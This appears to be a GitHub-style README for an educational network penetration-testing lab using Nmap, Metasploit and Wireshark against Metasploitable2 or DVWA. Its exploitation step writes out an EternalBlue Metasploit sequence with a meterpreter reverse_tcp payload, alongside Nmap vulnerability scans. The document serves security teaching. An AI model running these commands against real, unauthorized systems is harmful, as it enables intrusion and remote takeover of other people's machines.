# Network Penetration Testing & Ethical Hacking

## ⚠️ Disclaimer
This project is intended for educational and security research purposes only. Ensure you have proper authorization before conducting penetration testing.

## Project Overview
- **Technology Used:** Nmap, Metasploit, Wireshark, Kali Linux
- **Purpose:** Conduct a penetration test on a network to identify vulnerabilities and remediate them.
- **Output:** A security assessment report detailing vulnerabilities and mitigation steps.

## Prerequisites
- Basic understanding of networking and cybersecurity
- A dedicated testing environment (e.g., VirtualBox, VMware with Kali Linux)
- Administrative access to configure test systems

## Setup and Implementation
### Step 1: Set Up a Testing Environment
- Deploy **Kali Linux** as the attacking machine.
- Set up a vulnerable test environment using **Metasploitable2** or **DVWA** (Damn Vulnerable Web Application).

### Step 2: Network Scanning with Nmap
- Identify active hosts and open ports in the network.
```sh
nmap -sS -A -T4 192.168.1.0/24
```
- Scan for vulnerabilities using NSE scripts.
```sh
nmap --script vuln 192.168.1.100
```

### Step 3: Exploitation with Metasploit
- Launch **Metasploit Framework**.
```sh
msfconsole
```
- Search for exploits related to a detected vulnerability.
```sh
search exploit windows/smb
```
- Select and configure the exploit module.
```sh
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

### Step 4: Traffic Analysis with Wireshark
- Capture network traffic and analyze packets for suspicious activities.
- Filter traffic based on specific protocols (e.g., HTTP, SMB, FTP).
```sh
ip.addr == 192.168.1.100 && tcp.port == 80
```

### Step 5: Report Findings & Mitigation Strategies
- Document identified vulnerabilities, exploits used, and attack vectors.
- Provide recommendations such as **patch management, network segmentation, and access controls**.

## Key Features
- **Active reconnaissance and network scanning**
- **Exploitation of vulnerabilities using ethical hacking tools**
- **Traffic analysis and detection of security weaknesses**
- **Comprehensive security reporting and remediation steps**

## Future Enhancements
- Automate scanning with **Python and Nmap scripts**
- Integrate with **SIEM for real-time attack detection**
- Implement **Zero Trust security measures**

## Conclusion
Network penetration testing helps identify and mitigate security vulnerabilities before attackers exploit them. Using **Nmap, Metasploit, and Wireshark**, organizations can enhance their security posture and protect sensitive data.
